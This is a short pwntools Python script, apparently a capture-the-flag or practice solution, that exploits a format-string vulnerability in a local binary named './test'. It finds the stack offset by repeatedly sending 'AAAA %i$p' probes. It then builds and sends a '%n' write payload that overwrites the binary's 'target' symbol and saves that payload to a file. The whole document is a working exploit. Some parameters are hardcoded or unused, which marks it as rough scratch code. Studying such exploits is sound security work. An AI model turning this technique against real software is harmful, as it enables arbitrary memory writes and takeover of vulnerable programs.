from pwn import *

e = context.binary = ELF("./test")


def findOffset():
    s = e.process()
    i = 0
    s.sendline(f"AAAA %{i}$p")
    a = s.recvall().decode()
    while "41414141" not in a:
        i += 1
        s = e.process()
        s.sendline(f"AAAA %{i}$p")
        a = s.recvall().decode()

    print(a)
    print("Found offset at ", i)
    return i


def createPayload(address, value, offset=findOffset()):
    address = p32(address)
    addLen = len(address)
    # payload = address + f"%{value-addLen}x%{offset}$n".encode()
    # 64BIT
    # payload = f"%{value - addLen}x%{offset+1}$n".encode() + address
    # 32BIT
    payload = address + b"%4x%12$n"
    print(payload)
    return payload


# def exec_fmt(payload):
#     p = e.process()
#     p.sendline(payload)
#     return p.recvall()


# autofmt = FmtStr(exec_fmt)
# offset = autofmt.offset
# print(offset)

# writeAdd = 0x4040CC
writeAdd = e.sym.target
value = 9
offset = findOffset()
payload = createPayload(writeAdd, value)
# payload = fmtstr_payload(offset, {writeAdd: value})
print("SYM TARGET: ", hex(writeAdd))
print(payload)

s = e.process()
s.sendline(payload)
print(s.recvall())
with open("pay", "wb") as file:
    file.write(payload)


# s.sendline(payload)
# print(s.recvall())
